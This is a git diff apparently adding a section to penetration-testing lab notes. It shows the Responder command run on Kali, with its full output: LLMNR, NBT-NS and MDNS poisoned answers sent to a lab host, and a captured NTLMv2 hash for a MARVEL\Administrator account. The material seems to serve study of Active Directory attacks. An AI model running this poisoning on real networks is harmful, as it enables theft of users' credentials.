@@ -73,6 +73,105 @@ Serving Executable via HTTP&amp;WPAD is:OFF
 Always Serving a Specific File via HTTP&amp;WPAD is:OFF
 ```
 
+## Responder Capture:
+```
+sudo responder -I eth0 -rdwv                                                                                         1 ⨯
+[sudo] password for kali: 
+\                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [ON]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Fingerprint hosts          [OFF]
+
+[+] Generic Options:
+    Responder NIC              [eth0]
+    Responder IP               [192.168.1.44]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-ZCWKEUFD2NR]
+    Responder Domain Name      [FPLT.LOCAL]
+    Responder DCE-RPC Port     [45828]
+
+[+] Listening for events...                                                                                                  
+
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name spczydbl.local
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name lbflguzsoq.local
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name tlzuqrduak.local
+[HTTP] Sending NTLM authentication request to 192.168.1.36
+[HTTP] Sending NTLM authentication request to 192.168.1.36
+[HTTP] Sending NTLM authentication request to 192.168.1.36
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name ntrwtaw.local
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name JTYLUSIFQURZUU (service: Workstation/Redirector)
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name xwjexypadtzw.local
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name NTRWTAW (service: Workstation/Redirector)
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name XWJEXYPADTZW (service: Workstation/Redirector)
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name jtylusifqurzuu.local
+[HTTP] Sending NTLM authentication request to 192.168.1.36
+[HTTP] Sending NTLM authentication request to 192.168.1.36
+[HTTP] Sending NTLM authentication request to 192.168.1.36
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name bjinrrnb.local
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name BJINRRNB (service: Workstation/Redirector)
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name fkvostnszdjw.local
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name FKVOSTNSZDJW (service: Workstation/Redirector)
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name rlwyxkh.local
+[*] [NBT-NS] Poisoned answer sent to 192.168.1.36 for name RLWYXKH (service: Workstation/Redirector)
+[HTTP] Sending NTLM authentication request to 192.168.1.36
+[HTTP] Sending NTLM authentication request to 192.168.1.36
+[HTTP] Sending NTLM authentication request to 192.168.1.36
+[*] [MDNS] Poisoned answer sent to 192.168.1.36    for name DESKTOP-O1NFRBF.local
+[SMB] NTLMv2-SSP Client   : 192.168.1.40
+[SMB] NTLMv2-SSP Username : MARVEL\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::MARVEL:fa0dbe56d41c12c4:EADD45ECF791E71EA94D597D9A54EF98:0101000000000000007C4489E277D7014A3C1FC269108B450000000002000800460050004C00540001001E00570049004E002D005A00430057004B00450055004600440032004E00520004003400570049004E002D005A00430057004B00450055004600440032004E0052002E00460050004C0054002E004C004F00430041004C0003001400460050004C0054002E004C004F00430041004C0005001400460050004C0054002E004C004F00430041004C0007000800007C4489E277D701060004000200000008003000300000000000000000000000003000007DA804CBE1186A4144C0F6B84C3D34BBF02DEC5875E917BD7FE1F378B40843A50A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E0031002E0034003400000000000000000000000000 
+```
+
 # Attacking:
 ### Data Store:
 ```
